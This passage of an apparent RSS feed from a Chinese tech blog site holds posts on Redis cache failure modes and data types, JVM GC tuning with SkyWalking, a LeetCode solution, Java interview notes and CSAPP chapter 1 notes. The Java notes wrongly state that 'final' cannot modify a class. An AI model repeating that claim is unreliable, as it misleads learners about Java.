，不让其访问数据库，从而避免了对底层存储系统的查询压力。
布隆过滤器的设计实现原理
如果数据比较少，可以把数据库中的数据全部放到内存的一个map中。这样能够非常快速的识别，数据在缓存中是否存在。如果存在，则让其访问缓存。如果不存在，则直接拒绝该请求。但如果数据量太大，全都放到内存中，会占用太多的内存空间。因此要使用布隆过滤器。
布隆过滤器的底层使用bit数组存储数据，该数组中的元素默认值为0。
布隆过滤器第一次初始化的时候，会把数据库中所有已存在的key，经过一些列的hash算法（比如：三次hash算法）计算，每个key都会计算出多个位置，然后把这些位置上的元素值设置成1。之后，有用户key请求过来的时候，再用相同的hash算法计算位置。
如果多个位置中的元素值都是1，则说明该key在数据库中已存在。这时允许继续往后面操作。
如果有1个以上的位置上的元素值是0，则说明该key在数据库中不存在。这时可以拒绝该请求，而直接返回。
但若布隆过滤器中存储的数据量过大，会出现误判
的情况，即：
原本这个key在数据库中是不存在的，但布隆过滤器确认为存在。
同时如果数据库中的数据更新了，需要同步更新布隆过滤器。但它跟数据库是两个数据源，就可能存在数据不一致的情况。因此需要及时同步更新修改的内容。
误判率
：数组越小误判率就越大，数组越大误判率就越小，但是同时带来了更多的内存消耗。
优点
：内存占用较少，没有多余key
缺点：
实现复杂，存在误判
如何选择：针对一些恶意攻击，攻击带过来的大量key是随机，那么我们采用第一种方案就会缓存大量不存在key的数据。那么这种方案就不合适了，我们可以先对使用布隆过滤器方案进行过滤掉这些key。所以，针对这种key异常多、请求重复率比较低的数据，优先使用第二种方案直接过滤掉。而对于空数据的key有限的，重复率比较高的，则可优先采用第一种方式进行缓存。
2. 缓存雪崩及解决方案
缓存雪崩是指在
同一时段
大量的缓存key同时失效
或者Redis服务宕机
，导致大量请求到达数据库，带来巨大压力。
解决方案：
方案一：均匀过期
设置不同的过期时间，让缓存失效的时间尽量均匀，
避免相同的过期时间导致缓存雪崩
，造成大量数据库的访问。如把每个Key的失效时间都加个随机值，setRedis（Key，value，time + Math.random() * 10000）；，保证数据不会在同一时间大面积失效。
方案二：构建缓存高可用集群（针对缓存服务故障情况）
方案三：服务熔断、限流、降级等措施保障。
3. 缓存击穿及解决方案
缓存击穿跟缓存雪崩有点类似，
缓存雪崩是大规模的key失效，而缓存击穿是
某个热点的key失效
，大并发集中对其进行请求，就会造成大量请求读缓存没读到数据，从而导致高并发访问数据库，引起数据库压力剧增
。这种现象就叫做缓存击穿。
解决方案：
方案一：互斥锁
在缓存失效后，通过
互斥锁或者队列来控制读数据写缓存的线程数量
，比如某个key只允许一个线程查询数据和写缓存，其他线程等待。这种方式会阻塞其他的线程，此时系统的吞吐量会下降。
单机通过synchronized或lock来处理，分布式环境采用分布式锁。
原理
：线程1在查询缓存发现未命中的情况下，获取互斥锁，然后查询数据库重建缓存数据，写入缓存后，释放互斥锁。在线程1重建数据的时候，线程2也未命中缓存想重建时，在获取互斥锁时会失败，只能休眠一会儿再次尝试，直至线程1完成重建缓存的流程释放互斥锁后，线程2再查询缓存并命中。
优点
：强一致性（适用于严格要求缓存一致性的场景）
缺点
：性能差
方案二
：
热点数据缓存永远不过期
。永不过期实际包含两层意思：
物理不过期
，针对热点key不设置过期时间
逻辑过期
，把过期时间存在key对应的value里，如果发现要过期了，通过一个后台的异步线程进行缓存的构建。
原理
：线程1在查询缓存发现逻辑时间快过期时，获取互斥锁，然后后台开启一个新的线程，查询数据库重建缓存数据，写入缓存，重置逻辑过期时间，再释放锁。
当线程2在查询缓存也发现逻辑时间快过期时，获取互斥锁失败，此时直接从缓存中返回过期的数据。
优点
：可用性高，性能高
缺点
：存在数据不一致的情况（适用于不严格要求缓存一致性的场景）</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540052.html</guid><pubDate>Fri, 31 Oct 2025 07:22:14 +0000</pubDate></item><item><title>C语言 | Leetcode C语言题解之第476题数字的补数</title><link>https://www.ppmy.cn/news/1540053.html</link><description>题目：
题解：
class Solution {
public:int findComplement(int num) {int pos;for (int i = 30; i &gt;= 0; i--) {if (num &amp; (1 &lt;&lt; i)) {pos = i;break;}}return (((1LL &lt;&lt; (pos + 1)) - 1) ^ (num));}
};</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540053.html</guid><pubDate>Fri, 31 Oct 2025 07:22:16 +0000</pubDate></item><item><title>第05-02节：Redis的十大数据类型</title><link>https://www.ppmy.cn/news/1540054.html</link><description>我的后端学习大纲
我的Redis学习大纲
6、地理空间（GEO）类型简介：
6.1.什么是GEO：
1.GEO主要是用于地理位置信息，
并对存储的信息进行操作
，包括：
添加地理位置的坐标
获取地理位置的坐标
计算两个位置之间的距离
根据用户给定的经纬度坐标来获取指定范围内的地理位置集合
2.SQL进行地理位置查询的缺点：
select taxi from position where x0-r &lt; x &lt; x0 + r and y0-r &lt; y &lt; y0+r
查询性能问题，如果并发高，数据量大这种查询是要搞垮数据库的
这个查询的是一个矩形访问，而不是以我为中心r公里为半径的圆形访问。
精准度的问题，我们知道地球不是平面坐标系，而是一个圆球，这种矩形计算在长距离计算时会有很大误差
6.2.命令：
如何获取某个地址的经纬度：
百度地图可以获取
a.GEOADD添加经纬度坐标：
1.命令：
GEOADD city 116.403963 39.915119 "天安门" 116.403414 39.924091 "故宫" 116.024067 40.362639 "长城"
2.当有中文乱码的时候，
需要加--raw参数，这是客户端的原因：
b.GEOPOS返回经纬度：
d.GEOHAS:返回坐标的geohash表示：
a.命令
b.说明：
1.geohash算法生成的base32编码值，3维变2维再变1维
c.GEODIST:两个位置之间的距离：
命令：
GEODIST city 天安门 故宫 km
f.GEORADIUS：
1.
georadius
以给定的经纬度为中心， 返回键包含的位置元素当中， 与中心的距离不超过给定最大距离的所有位置元素
GEORADIUS city 116.418017 39.914402 10 km withdist withcoord count 10 withhash desc
GEORADIUS city 116.418017 39.914402 10 km withdist withcoord withhash count 10 desc
说明：
WITHDIST:
在返回位置元素的同时， 将位置元素与中心之间的距离也一并返回。 距离的单位和用户给定的范围单位保持一致
WITHCOORD:
将位置元素的经度和维度也一并返回
WITHHASH:
以 52 位有符号整数的形式， 返回位置元素经过原始 geohash 编码的有序集合分值。 这个选项主要用于底层应用或者调试， 实际中的作用并不大
COUNT
限定返回的记录数。
案例：
当前位置(116.418017 39.914402)
g.GEORADIUSBYMEMBER:
7、基数统计（HyperLogLog）类型：
7.1.什么是基数统计：
1.HyperLogLog主要是用于
做基数（不重复的数字或者ip，重点是不重复，这就是基数）统计的算法
，HyperLogLog的优点是：在输入元素的数量或者体积非常非常大的时候，计算基数所需的空间总是固定且很小的
2
.在redis中，每个HyperLogLog键只需要花费12KB内存，就可以计算2的64次方的不同元素的基数
，这和基数计算时，元素越多内存消耗就越多的集合形成鲜明对比
3.但因为HyperLogLog只会根据输入元素来计算基数，而
不会存储输入元素本身
，所以HyperLogLog不能像集合那样，返回输入的各个元素
7.2.基本命令：
7.3.应用场景：
8、位图（bitmap）类型：
a.什么是位图：
1.位图（bitmap）是由0和1状态表现的二进制位的bit数组
说明：
用String类型作为底层数据结构实现的一种统计二值状态的数据类型
位图本质是数组，它是基于String数据类型的按位的操作。该数组由多个二进制位组成，每个二进制位都对应一个偏移量(我们称之为一个索引)。
Bitmap支持的
最大位数是2^32位
，它可以极大的节约存储空间，
使用512M内存就可以存储多达42.9亿的字节信息(2^32 = 4294967296)
c.基本命令：
setbit命令
：Bitmap的偏移量是从0开始算的
getbit命令
：
strlen命令
：统计字节占用多少，
不是统计字符串的长度，而是占据了几个字节。超过8位后自己按照8位一组byte进行扩容
bitcount
：
全部键里面含有1的有多少个
：
bitpop命令
:假设统计连续2天都签到的用户
1.加入某个网站或者系统，它的用户有1000W，
做个用户id和位置的映射
比如0号位对应用户id：uid-092iok-lkj
比如1号位对应用户id：uid-7388c-xxx
2.登录登记：
可以看到连续2天登录的人有：
2个
setbit和getbit案例说明：
1.案例：登记某个人在2021年6月的每一天签到情况
2.查询某个人在2021年6月份签到的总天数：
b.应用场景：
主要用于状态的统计，Y、N，类似AtomicBoolean
可以用于
定义今天是否签到、是否打卡、是否有相同的爱好、电影广告是否被点击过等场景
9、位域（bitfield）位域（了解）：
a.bitfield是什么：
b.bitfield可以做什么：
位域修改
溢出控制
c.基本语法：
BITFIELD key [GET type offset] [SET type offset value] [INCRBY type offset increment] [OVERFLOW WRAP|SAT|FAIL]
10、流（Stream）类型：
10.1.Stream简介：
10.2.基本命令理论：
1.队列相关指令：
2.消费组相关指令：
3.四个特殊符号：
10.3.基本命令实操：Redis流实例演示：
a.对列相关指令：
b.消费组相关指令：
c.XINFO：</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540054.html</guid><pubDate>Fri, 31 Oct 2025 07:22:19 +0000</pubDate></item><item><title>nodejs 实现docker 精简可视化控制</title><link>https://www.ppmy.cn/news/1540055.html</link><description>地址
https://github.com/xiaobaidadada/filecat
说明
使用react 和nodejs 实现的非常轻量的服务docker管理。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540055.html</guid><pubDate>Fri, 31 Oct 2025 07:22:20 +0000</pubDate></item><item><title>RK3588设计指导的学习（一）</title><link>https://www.ppmy.cn/news/1540056.html</link><description>华秋的计算工具也可以计算阻抗：
这一点倒是挺重要的：</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540056.html</guid><pubDate>Fri, 31 Oct 2025 07:22:22 +0000</pubDate></item><item><title>【实战篇】用SkyWalking排查线上[xxl-job xxl-rpc remoting error]问题</title><link>https://www.ppmy.cn/news/1540057.html</link><description>一、组件简介和问题描述
SkyWalking 简介
Apache SkyWalking 是一个开源的 APM（应用性能管理）工具，专注于微服务、云原生和容器化环境。它提供了分布式追踪、性能监控和依赖分析等功能，帮助开发者快速定位和解决性能瓶颈和故障。
xxl-job 简介
xxl-job 是一个轻量级的分布式任务调度框架，支持定时任务的管理与执行。它提供了简单易用的界面和丰富的功能，适合于各种业务场景。
遇到的问题
在使用 xxl-job 的过程中，突然有一天开始遇到了以下错误：
错误码
：500
错误信息
：
msg：xxl-rpc remoting error(Read timed out)
并且出现了大量的调度结果失败，但是执行结果成功的情况
这个错误通常表示在与 xxl-job 的 RPC 通信过程中发生了超时，可能由以下原因引起：
网络问题
：服务间的网络连接不稳定，导致请求超时。(排查了不是这个问题)
服务没收到任务下发（如果这样的话它是不会执行的）
服务收到下发但是没有及时回复给xxl-job服务（怀疑）
二、开始使用SkyWalking 排查问题
JVM指标查看
发现发生了很多次年轻代、老年代GC，每分钟花费最多快达到了1秒
第一次发生是在10-12 21:35
此时发生了老年、年轻代GC
21:35分的时候发生一次
此时也是发生了老年、年轻代GC
三、猜测并调整
是不是每次发生调度失败的时候都会有GC 存在呢，我们试着修改一下JVM启动参数
-Xmn3G
-XX:SurvivorRatio=8
-XX:MaxTenuringThreshold=6
-XX:InitiatingHeapOccupancyPercent=40
-XX:+UseG1GC
-XX:MaxGCPauseMillis=200
1.
年轻代和老年代的设置
-Xmn3G
：设置年轻代的大小为 3 GB。年轻代的大小会影响到 GC 的频率。适当增大年轻代的大小可以减少年轻代 GC 的次数，但同时也要注意不要过大，以免影响老年代的内存。
2.
Survivor Ratio
-XX:SurvivorRatio=8
：这个参数定义了 Eden 区和 Survivor 区的比例。在你的设置中，Eden 区占 8 份，Survivor 区占 1 份。适当调整这个比例，可以优化对象在年轻代中的存活时间，从而减少 GC 次数。可以考虑增加 Survivor 区的比例，以便更多的存活对象能够进入 Survivor 区，减少晋升到老年代的频率。
3.
最大晋升阈值
-XX:MaxTenuringThreshold=6
：这个参数定义了对象在年轻代中存活的最大 GC 次数，超过这个次数的对象将被晋升到老年代。如果希望减少老年代的 GC 次数，可以考虑增加这个值，允许对象在年轻代中存活更长时间，从而减少晋升到老年代的频率。
4.
堆占用率
-XX:InitiatingHeapOccupancyPercent=40
：这个参数定义了老年代开始 GC 的堆占用率。适当提高这个值，可以延迟老年代的 GC，减少其发生频率。
5.
G1 垃圾回收器
-XX:+UseG1GC
和
-XX:MaxGCPauseMillis=200
：G1 垃圾回收器旨在减少 GC 暂停时间，适当调整这些参数可以优化 GC 性能。通过设置合理的暂停目标，可以在一定程度上减少 GC 的次数。
6.
直接内存大小
-XX:MaxDirectMemorySize=512m
：虽然这个参数主要控制直接内存的使用，但合理配置可以避免因直接内存不足而导致的额外 GC。
四、调整后重启服务
重启服务后发现老年代已经很久没有了GC触发，年轻代的GC也没有了那么频繁
CPU利用率也不再那么高了
五、回到问题
发现这个错误已经不报了，并且全部是调度、执行都成功
错误码
：500
错误信息
：
msg：xxl-rpc remoting error(Read timed out)
六、GC的解释
年轻代 GC
类型
：通常使用的是 Minor GC。
影响
：年轻代 GC 通常会导致短暂的 STW，暂停所有应用程序线程。由于年轻代 GC 的目的是清理短生命周期的对象，因此它的执行时间通常较短，通常在几毫秒到几秒之间。
老年代 GC
类型
：通常使用的是 Major GC 或 Full GC。
影响
：老年代 GC 通常会导致更长时间的 STW，因为它需要检查整个堆的内容。老年代的 GC 过程可能会更复杂，导致暂停时间更长，通常从几秒到几十秒不等。
G1垃圾回收器的特点
并行性
：
G1 GC 在进行垃圾回收时会使用多个线程来并行处理，这样可以更有效地利用多核 CPU，减少停顿时间。
增量式回收
：
G1 将堆分为多个区域（Region），在进行垃圾回收时，它会增量地回收这些区域，而不是一次性回收整个堆。这种方式可以降低 GC 的停顿时间。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540057.html</guid><pubDate>Fri, 31 Oct 2025 07:22:25 +0000</pubDate></item><item><title>八股面试3（自用）</title><link>https://www.ppmy.cn/news/1540058.html</link><description>基本数据类型和引用数据类型区别
java中数据类型分为基本数据类型和引用数据类型
8大基本数据类型
1.整数：int，long，short，byte
2.浮点类型：float，double
3.字符类型：char
4.布尔类型：boolean
引用数据类型（除了8大基本数据类型就是引用类型）
类，接口类型，数组类型，枚举类型，注解类型，字符串String型
区别：
1.存储位置
基本数据类型存在栈中，引用数据类型存在堆中。
2.值传递与引用传递
对于基本数据类型，传递的是值本身，即当函数参数传递时，实际上是值的一个副本。函数内部的修改不会影响到原始变量。
对于引用数据类型，传递的是引用（即内存地址）。这意味着函数内部对引用数据的修改会影响到原始数据。
3.生命周期
基本数据类型的生命周期与它们所在的代码块或作用域相关。一旦超出其作用域，其值将被销毁。
引用数据类型的生命周期由垃圾回收器管理。即使引用变量超出了作用域，
只要堆内存中的对象仍然被引用，它们就不会被销毁。
final修饰的引用数据类型，值可以在构造器中二次修改吗
在Java中，
final
关键字不能修饰一个类，只能修饰方法或变量。虽然类也是引用数据类型，final可以修饰引用数据类型，但是不能修饰类。
final修饰的引用数据类型，值可以在构造器中二次修改
例如，当
final
修饰的是引用数据类型（如对象或数组）时，它意味着这个引用本身不能被改变，也就是说你不能让
final
引用指向另一个对象。但是，这并不妨碍你修改这个对象的内容。
public class Test {private final User user;public Test(User user) {this.user = user;// 这里你不能让user指向另一个User对象// this.user = anotherUser; // 这行代码会导致编译错误// 但是你可以修改user的内容user.setName("New Name");}
}class User {private String name;public User(String name) {this.name = name;}public void setName(String name) {this.name = name;}public String getName() {return name;}
}
jvm内存结构
1.堆区：
这是Java虚拟机所管理的最大一块内存区域，几乎所有的对象实例和数组都将在这里分配内存。堆是垃圾收集器管理的主要区域，因此很多时候也被称为“GC堆”。从Java 8开始，
字符串常量池
也移动到了堆中。
2.栈区：
每个线程在创建时都会创建一个虚拟机栈，其生命周期与线程相同。每一个方法执行的时候都会创建一个栈帧，用于存储局部变量表、操作数栈、动态链接、方法出口等信息。每一个方法被调用直至执行完成的过程，就对应着一个栈帧在虚拟机栈中入栈到出栈的过程。
3.方法区：
也被称为非堆（Non-Heap），用于存储
已被加载的类信息
、
常量、静态变量
、即时编译器编译后的代码等数据。虽然Java虚拟机规范把方法区描述为堆的一个逻辑部分，但它有一个别名叫做Non-Heap，目的是与Java堆区分开来。
4.程序计数器（就是写代码旁边显示的多少行）：
当前线程所执行的字节码的行号指示器。
5.本地栈
jvm堆栈区别
堆（Heap）
堆是JVM中最大的内存区域，主要用于存储对象实例和数组。
堆是垃圾收集器（GC）的主要管理区域。当对象不再被引用时，垃圾收集器会回收这部分内存。
堆中的内存分配是动态的，即程序在运行时可以动态地创建和销毁对象。
栈（Stack）
栈是线程私有的，每个线程都有一个自己的栈。
栈用于存储方法的执行信息，包括局部变量表、操作数栈、动态链接等。
栈的大小是固定的，每个线程的栈深度由JVM决定。
栈的生命周期与线程相同，当线程结束时，栈也会销毁。
set能不能存null
首先先明确，
hashSet是基于hashMap实现的
，又要明确hashMap和hashTable的区别
hashMap线程不安全
，
hashTable线程安全
，其实现方法里面都添加了synchronized关键字来确保线程同步。
hashMap可以使用null作为key，hashTable不允许null作为key
，因此结合上述hashSet是基于hashMap实现的，所以，
hashSet可以使用null作为key
索引过多对操作有什么影响
索引
：提高检索效率，降低排序成本，索引对应的字段有自动排序的功能，默认升序
缺点
：
1.
创建和维护索引需要耗时
，并且随着数据量的增加而增加
2.索引需要
占用物理空间
，随数据量增加而增加
3.
降低表的增删改的效率
，每次增删改索引都需要进行动态维护
索引的适用场景：
较为频繁的作为查询条件的字段
不适用的场景：
1.字段值的唯一性太差不适合做索引，即
该字段的数据太多重复
就不适合做索引
2.
更新非常频繁
的字段
3.
不会作为查询条件
（不会出现在where语句）不适合做索引
concurrentmap</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540058.html</guid><pubDate>Fri, 31 Oct 2025 07:22:27 +0000</pubDate></item><item><title>深入理解计算机系统--计算机系统漫游</title><link>https://www.ppmy.cn/news/1540059.html</link><description>对于一段最基础代码的文件hello.c，解释程序的运行
#include &lt;stdio.h&gt;int main()
{printf ( "Hello, world\n") ;return 0;
}
1.1、信息就是位+上下文
源程序是由值 0 和 1 组成的位（比特）序列，8 个位被组织成一组，称为字节（表示程序中的某些文本字符）。
计算机系统采用 ASCII标准 来表示文本字符，实际上就是用一个
唯一的单字节大小的整数值
来表示每个字符，例如，下面给出 hello.c程序 的ASCII码表示。
注意：每个文本行都是以一个看不见的换行符 '\n' 结束的，对应的整数值为10
像 hello.c 这样只由 ASCII字符 构成的文件称为
文本文件
，所有其他文件称为
二进制文件
系统中所有的信息（包括磁盘文件、内存中的程序、内存中存放的用户数据以及网络上传送的数据）都是由一串比特表示的。区分不同数据对象的唯一方法是读到这些数据对象时的上下文（在不同的上下文中，一个同样的字节序列可能表示一个整数，浮点数，字符串或者机器指令）
1.2、程序被其他程序翻译成不同的格式
程序为了能够在系统上运行必须转化为
一系列的低级机器语言指令
，然后这些指令按照一种称为
可执行目标程序
的格式打包，并以
二进制磁盘文件的形式存放
，目标程序也称为
可执行目标文件
。
在Linux系统，从源文件到目标文件的转化是由编译器驱动程序
linux&gt; gcc -o hello hello.c
GCC编译器驱动程序将 hello程序 翻译成一个
可执行的目标文件hello
。由以下四个阶段完成
① 预处理阶段：预处理器（cpp）根据以字符 # 开头的命令，修改原始的C程序。
比如 hello.c 中第一行的 #include&lt;stdio.h&gt; 命令告诉预处理器读取系统头文件 stdio.h 的内容，并把它直接插入程序文本中。就得到了另一个C程序，通常是以
.i
作为文件扩展名。
②
编译阶段：
编译器（ccl）将文本文件 hello.i 翻译成文本文件 hello.s，它
包含一个汇编语言程序
。该程序包含函数 main 的定义，如下：
main:
subq $8, %rsp
movl $.LC0, %edi
call puts
movl $0, %eax
addq $8, %rsp
ret
定义中 2~7 行的每条语句都以一种文本格式描述了一条低级机器语言指令
，汇编语言为不同高级语言的不同编译器
提供了通用的输出语言
。例如，C编译器和 Fortran 编译器产生的输出文件用的都是一样的汇编语言。
③ 汇编阶段：
汇编器（as）将 hello,s 翻译成机器语言指令，把这些指令打包成一种叫做
可重定位目标程序的格式，并将结果保存在目标文件 hello.o 中
，
hello.o 是二进制文件，它包含的17个字节是函数 main 的指令编码
，如果用文本编辑器打开，将会出现一堆乱码。
④ 链接阶段：
hello 程序调用了 printf 函数，它是每个C编译器都提供的标准C 库中的一个函数。printf 函数存在于一个名为 printf.o 的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的 hello.o 程序中。
链接器（ld）就负责处理这种合并
。结果就得到 hello 文件，它是一个
可执行目标文件（可执行文件）
，可以被加载到内存中，由系统执行。
1.3 了解编译系统如何工作是大有益处的
优化程序性能：
了解一些机器代码以及编译器将不同的C语句转化为机器代码的方式，判断更高效的C语句。
理解链接时出现的错误
避免安全漏洞
1.4 处理器读并解释储存在内存中的指令
此时，hello.c 源程序已经被编译系统翻译成了可执行目标文件hello，并被存放在磁盘上。要想在Linux系统上运行该可执行文件，将其文件名输入到称为 shell 的应用程序中：
linux&gt; ./hello
hello, world
linux&gt;
shell 是一个命令行解释器，它输出一个提示符，等待输入一个命令行，然后执行这个命令。如果该命令行的第一个单词不是一个内置的 shell 命令，那么 shell 就会假设这是一个可执行文件的名字，它将加载并运行这个文件。所以在此例中，shell 将加载并运行 hello 程序，然后等待程序终止。hello 程序在屏幕上输出它的消息，然后终止。shell 随后输出一个提示符，等待下一个输入的命令行。
1.4.1 系统的硬件组成
1.总线
贯穿整个系统的是一组电子管道，称作总线，携带信息字节并负责在各个部件间传递。通常
总线被设计成传送定长的字节块，也就是字（word）
。字中的字节数（即字长）是一个基本的系统参数，各个系统中都不尽相同。现在的大多数机器字长要么是 4 个字节（32 位），要么是 8 个字节（64 位）。
2. I/O 设备
I/O（输入/输出）设备是系统与外部世界的联系通道。我们的示例系统包括四个 I/O 设备∶作为
用户输入的键盘和鼠标
，作为
用户输出的显示器
，以及用于
长期存储数据和程序的磁盘驱动器
（简单地说就是
磁盘
）。最开始，
可执行程序 hello 就存放在磁盘上
。
每个 I/O 设备都通过一个
控制器
或
适配器
与 I/O 总线相连。控制器和适配器之间的区别主要在于
它们的封装方式
。
控制器是 I/O 设备本身或者系统的主印制电路板（通常称作主板）上的芯片组
。而
适配器则是一块插在主板插槽上的卡
。无论如何，它们的功能都是在
I/O 总线和 I/O 设备之间传递信息
。
（CPU：中央处理单元    ALU：算数／逻辑单元　PC：程序计数器　USB：通用串行总线）
３.主存
主存是一个临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据。
从物理上来说，主存是由一组
动态随机存取存储器
（DRAM）芯片组成的。
从逻辑上来说，存储器是一个线性的字节数组，
每个字节都有其唯一的地址（数组索引）
，这些地址是从零开始的。一般来说，组成程序的每条机器指令都由不同数量的字节构成。与 C 程序变量相对应的数据项的大小是根据类型变化的。(short : 2 ; int 和 float :4 ; long 和 double:8)
4.处理器
中央处理单元(CPU)，简称处理器
，是
解释（或执行）存储在主存中指令的引擎
，处理器的核心是一个
大小为一个字的存储设备（寄存器），称为程序计数器（PC)
, 在任何时刻，
PC 都指向主存中的某条机器语言指令
（即含有该条指令的地址）。
从系统通电开始，直到系统断电，处理器一直在不断地执行程序计数器指向的指令，再更新程序计数器，使其指向下一条指令。
这个模型是由指令集架构决定的。
在这个模型中，指令按照严格的顺序执行，而执行一条指令包含执行一系列的步骤。
处理器从程序计数器指向的内存处读取指令，解释指令中的位，执行该指令指示的简单操作，然后更新 PC，使其指向下一条指令，
而这条指令并不一定和在内存中刚刚执行的指令相邻。
它们围绕着主存、
寄存器文件
（register file）和
算术/逻辑单元
（ALU）进行。寄存器文件是一个小的存储设备，由一些单个字长的寄存器组成，每个寄存器都有唯一的名字。ALU 计算新的数据和地址值.
CPU在指令的操作下可能会执行的操作
加载
: 从主存复制一个字节或者一个字到寄存器,以覆盖寄存器原来的内容
存储
: 从寄存器复制一个字节或者一个字到主存的某个位置,以覆盖这个位置上原来的内容
操作
: 把两个寄存器的内容复制到ALU，ALU对这两个字做算数运算,并将结果存放到一个寄存器中,以覆盖该寄存器原来的内容
跳转
: 从指令本身中抽取一个字,并将这个字复制到程序计数器(PC)中,以覆盖PC中原来的值
处理器看上去是它的指令集架构的简单实现，但是实际上现代处理器使用了非常复杂的机制来加速程序的执行。因此，我们将
处理器的指令集架构
和
处理器的微体系结构
区分开来：
指令集架构描述的是每条机器代码指令的效果；
而微体系结构描述的是处理器实际上是如何实现的
1.4.2 运行 hello 程序
初始时, shell 程序执行它的指令,输入指令后(这里以输入字符串 "./hello" 为例), shell 程序将字符逐一读入寄存器,再把它存放到内存中.
然后 shell 执行一系列指令来加载可执行的 hello 文件，这些指令将 hello 目标文件中的代码和数据从磁盘复制到主存。数据包括最终会被输出的字符串 “hello, world\n”。
利用直接存储器存取,数据可以不通过处理器而直接从磁盘到达主存,如下图所示
一旦目标文件 hello 中的代码和数据被加载到主存，处理器就开始执行 hello 程序的 main 程序中的机器语言指令。这些指令将 “hello, world\n” 字符串中的字节从主存复制到寄存器文件，再从寄存器文件中复制到显示设备，最终显示在屏幕上。
1.5 高速缓存至关重要
通常情况下，
大容量的存储设备的存取速度要比小容量的慢，运行速度更快的设备的价格相对于低速设备要更贵。
例如：在一个系统上，磁盘的容量一般为 TB 级，内存的容量一般为 GB 级，磁盘的容量大概是内存的 1000 倍
对于处理器而言，从磁盘上读取一个字所花费的时间开销比从内存中读取的开销大1000万倍。寄存器文件的只能存储几百个字节的信息，而内存的可以存放几十亿的字节信息（GB级），从寄存器文件读取数据比从内存读取差不多要快 100 倍
针对处理器和内存之间的差异，系统设计人员在寄存器文件和内存之间引入了高速缓存存储器(高速缓存)（cache），处理能力比较强的处理器，一般有三级高速缓存，分别为 L1 cache ， L2 cache 以及L3 cache
L1 cache 的访问速度与访问寄存器文件几乎一样快，容量大小为数万字节（KB 级别）
；
L2 cache 的访问速度是 L1 cache 的五分之一，容量大小为数十万到数百万字节之间；
L3 cache 的容量更大，同样访问速度与 L2 cache 相比也更慢
1.6 存储设备形成层次结构
在这个层次结构中，从上至下，设备的访问速度越来越慢、容量越来越大，并且每字节的造价也越来越便宜。
存储器层次结构的主要思想是上一层的存储器作为低一层存储器的高速缓存。因此，寄存器文件就是 L1 的高速缓存，L1 是 L2 的高速缓存，L2 是 L3 的高速缓存，L3 是主存的高速缓存，而主存又是磁盘的高速缓存
1.7 操作系统管理硬件
把操作系统看成是应用程序和硬件之间插入的一层软件
，所有应用程序对硬件的操作尝试都必须通过操作系统。
操作系统有两个基本功能:
① 防止硬件被失控的应用程序滥用
② 向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。
操作系统通过几个基本的抽象概念（
进程
、
虚拟内存
和
文件
）来实现这两个功能。
① 进程则是对处理器、主存和 I/O 设备的抽象表示。
② 虚拟内存是对主存和磁盘 I/O 设备的抽象表示，
③ 文件是对 I/O 设备的抽象表示，
1.7.1 进程
进程
是操作系统对一个正在运行的程序的一种抽象。在一个系统上可以同时运行多个进程，而每个进程都好像在独占地使用硬件。而
并发运行
，则是说一个进程的指令和另一个进程的指令是交错执行的。在大多数系统中，需要运行的进程数是多于可以运行它们的 CPU 个数的。
无论是在单核还是多核系统，一个CPU看上去都像是在并发的执行多个进程，这是
通过处理器在进程间来回切换的
。
操作系统的这种机制叫做上下文切换.
操作系统保持跟踪进程运行所需的所有状态信息。
这种状态，就是
上下文
，包括许多信息，比如 PC 和寄存器文件的当前值，以及主存的内容。在任何一个时刻，单处理器系统都只能执行一个进程的代码。
当操作系统决定要把控制权从当前进程转移到某个新进程时，就会进行上下文切换，即保存当前进程的上下文、恢复新进程的上下文，然后将控制权传递到新进程。新进程就会从它上次停止的地方开始。
示例场景中有两个并发的进程∶
shell 进程和 hello 进程
。最开始，只有 shell 进程在运行，即等待命令行上的输入。当我们让它运行 hello 程序时，shell 通过调用一个专门的函数，即系统调用，来执行我们的请求，系统调用会将控制权传递给操作系统。操作系统保存 shell 进程的上下文，创建一个新的 hello 进程及其上下文，然后将控制权传给新的 hello 进程。hello 进程终止后，操作系统恢复 shell 进程的上下文，并将控制权传回给它，shell 进程会继续等待下一个命令行输入。
从一个进程到另一个进程的转换是由操作系统
内核
（kernel）管理的。内核是
操作系统代码常驻主存的部分
。当应用程序需要操作系统的某些操作时，比如读写文件，它就执行一条特殊的
系统调用
（system call）指令，将控制权传递给内核。然后内核执行被请求的操作并返回应用程序。注意，
内核不是一个独立的进程。相反，它是系统管理全部进程所用代码和数据结构的集合。
实现进程这个抽象概念需要低级硬件和操作系统软件之间的紧密合作。
1.7.2 线程
现代系统中，一个进程实际上可以由多个称为
线程
的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和全局数据。
因为多线程之间比多进程之间更容易共享数据，也因为线程一般来说都比进程更高效。
1.7.3 虚拟内存
虚拟内存是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存。每个进程看到的内存都是一致的，称为虚拟地址空间。
在 Linux 中，
地址空间最上面的区域是保留给操作系统中的代码和数据的
，这对所有进程来说都是一样。
地址空间的底部区域存放用户进程定义的代码和数据。
请注意，图中的地址是
从下往上增大的
。
程序代码和数据。
对所有的进程来说，
代码是从同一固定地址开始
，紧接着的是和 C 全局变量相对应的数据位置。
代码和数据区是直接按照可执行目标文件的内容初始化的
，在示例中就是可执行文件 hello。
堆。
代码和数据区后紧随着的是运行时堆。代码和数据区在进程一开始运行时就被指定了大小，与此不同，当调用像 malloc 和 free 这样的 C 标准库函数时，
堆可以在运行时动态地扩展和收缩
。
共享库。
大约在
地址空间的中间部分是一块用来存放像 C 标准库和数学库这样的共享库的代码和数据的区域。
栈。
位于
用户虚拟地址空间顶部
的是
用户栈
，
编译器用它来实现函数调用
。和堆一样，
用户栈在程序执行期间可以动态地扩展和收缩。特别地，每次我们调用一个函数时，栈就会增长；从一个函数返回时，栈就会收缩
内核虚拟内存。地址空间顶部的区域是为内核保留的
。
不允许应用程序读写这个区域的内容或者直接调用内核代码定义的函数。
虚拟内存的运作需要硬件和操作系统软件之间精密复杂的交互，包括对处理器生成的每个地址的硬件翻译。
基本思想是把
一个进程虚拟内存的内容存储在磁盘上，然后用主存作为磁盘的高速缓存。
1.7.4 文件
